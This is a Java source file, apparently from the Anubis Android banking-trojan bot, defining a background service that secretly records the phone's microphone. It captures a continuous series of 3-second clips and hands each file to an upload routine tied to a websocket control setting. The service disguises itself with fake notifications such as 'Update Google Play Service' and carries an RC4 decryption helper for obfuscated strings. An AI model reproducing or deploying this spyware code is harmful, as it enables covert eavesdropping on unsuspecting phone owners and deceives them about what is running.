package anubis.bot.myapplication.API.Sound;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.Notification;
import android.content.Intent;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import java.io.IOException;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;

public class ServiceStreamSound extends IntentService {
    String filePrefix = "";
    boolean startRecord;
    UtilsClass utilsClass = new UtilsClass();
    Context context;

    private static final int NOTIFY_ID=9906;
    private Notification notif;
    Intent intent;

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public ServiceStreamSound() {
        super("ServiceRecordSound");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        utilsClass.Log("Start","ServiceRecordSound");
        int jj=0;
        context = this;
        startRecord = true;
        if(intent.getStringExtra("str").equals("foreground")){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                utilsClass.LoadLibNotification(this, "Google", "Update Google Play Service");
            }else{
                foregroundify();
            }
        }

        while(true){
            if(startRecord){
                UtilsClass utilsClass = new UtilsClass();
                if((utilsClass.SetRead(this,"sound").equals("stop"))||(utilsClass.SetRead(this,"websocket").equals(""))){
                    stopService(intent);
                    break;
                }else{
                    try {
                        filePrefix = getExternalFilesDir(null) + "/" + jj;
                        Log.e("+", "" + filePrefix + ".amr");
                        recordAudio(context, filePrefix + ".amr", 3);
                        jj++;
                        if (jj >= 10) jj = 0;
                    }catch (Exception ex){
                        utilsClass.Log("RecordSound","ERROR!");
                    }
                }
            }
        }
    }

    void recordAudio(final Context cont, String file, final int time) {
        final MediaRecorder recorder = new MediaRecorder();
        final String namefile = file;

            utilsClass.Log("SOUND", "START RECORD SOUND");
            startRecord = false;
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(file);

        Thread timer = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(time * 1000);
                } catch (InterruptedException e) {

                } finally {
                    utilsClass.Log("SOUND","STOP RECORD SOUND");
                    try {
                    recorder.stop();
                    recorder.release();
                    startRecord=true;
                    Log.e("FILE",""+namefile);

                       utilsClass.inputFile(cont, namefile, "", "sound[]");
                    }catch (Exception ex){
                        utilsClass.Log("ERROR","Record Sound! " + ex);
                        return;
                    }

                }
            }
        });


        try {
            recorder.prepare();
            recorder.start();
            timer.start();
        } catch (IOException e) {}
    }

    @TargetApi(16)
    private void foregroundify() {
        notif = new Notification.Builder(context)
                .setContentTitle("Info")
                .setContentText("Update The Driver System..")
                .setSmallIcon(R.drawable.im)
                .build();
        startForeground(NOTIFY_ID,notif);
    }
}
